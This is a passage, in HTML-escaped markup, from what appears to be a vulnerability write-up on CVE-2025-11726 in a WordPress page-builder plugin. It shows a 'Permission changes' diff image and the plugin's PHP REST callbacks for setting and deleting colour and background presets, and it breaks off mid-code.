&lt;code&gt;editor&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff2.png&#34; title=&#34;Permission changes&#34; data-thumbnail=&#34;/posts/2025-12-07-cve-2025-11726/diff2.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff2&lt;/h2&gt;&lt;p&gt;Permission changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff2.png&#39; alt=&#34;Diff2&#34; height=&#34;341&#34; width=&#34;1748&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Permission changes&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;strong&gt;Corresponding endpoint callbacks:&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;set_color_presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$color_presets&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_fl_builder_color_presets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;clearPresets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;clearPresets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_fl_builder_color_presets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;presets&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[],&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Dedupe&amp;ensp;the&amp;ensp;merged&amp;ensp;arrays&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_presets&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_unique&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_merge&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$color_presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;addPresets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_fl_builder_color_presets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_presets&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;presets&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;delete_color_presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$color_presets&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_fl_builder_color_presets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_presets&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_values&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$color_presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$color&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;for&amp;ensp;exact&amp;ensp;match&amp;ensp;and&amp;ensp;value&amp;ensp;w/&amp;ensp;#&amp;ensp;prepended&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$color&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;deletePresets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;#&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$color&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;deletePresets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_fl_builder_color_presets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_presets&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$color_presets&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;presets&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$color_presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;set_background_presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$presets&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_fl_builder_color_presets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_presets&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_merge&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;addPresets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_fl_builder_background_presets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_presets&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span 